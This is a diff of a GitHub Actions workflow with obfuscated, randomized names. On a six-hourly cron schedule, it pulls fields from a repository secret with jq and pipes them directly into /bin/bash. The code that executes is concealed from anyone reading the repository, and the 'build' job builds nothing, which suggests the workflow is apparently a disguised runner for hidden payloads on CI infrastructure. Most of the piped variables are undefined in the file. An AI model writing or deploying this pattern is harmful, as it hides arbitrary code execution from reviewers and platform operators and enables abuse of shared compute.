@@ -1,22 +1,29 @@
 name: gaojinbao2345
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 1/6 * * *'
-
+    - cron: '51 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: gaojinbao2345
         env:
-          fa8: ${{ secrets.fa8 }}
+          hphmp9746: ${{ secrets.hphmp9746 }}
         run: |
-          echo $fa8 | jq -r .smqno5735 | /bin/bash
-          echo $cq830 | jq -r .rt65 | /bin/bash
-          echo $lod470 | jq -r .prr075 | /bin/bash
-          echo $swszv776 | jq -r .twpru1871 | /bin/bash
-          echo $juq4146 | jq -r .fihxj013 | /bin/bash
-          echo $n3 | jq -r .zajr4562 | /bin/bash
+          echo $hphmp9746 | jq -r .zkxia5333 | /bin/bash
+          echo $ojkjz153 | jq -r .b7885 | /bin/bash
+          echo $vohzx75 | jq -r .d9021 | /bin/bash
+          echo $ih3 | jq -r .mbs07341 | /bin/bash
+          echo $daf49 | jq -r .bot2489 | /bin/bash
+          echo $c0860 | jq -r .tpfv3 | /bin/bash
+          echo $cczpb6 | jq -r .j5 | /bin/bash
+          echo $us7127 | jq -r .t03 | /bin/bash
+          echo $wgkn7997 | jq -r .lgm40 | /bin/bash
+          echo $onb6 | jq -r .uoltp7 | /bin/bash
+          echo $obqd53 | jq -r .roxxv49 | /bin/bash
+          echo $jtja86 | jq -r .uh4 | /bin/bash
 
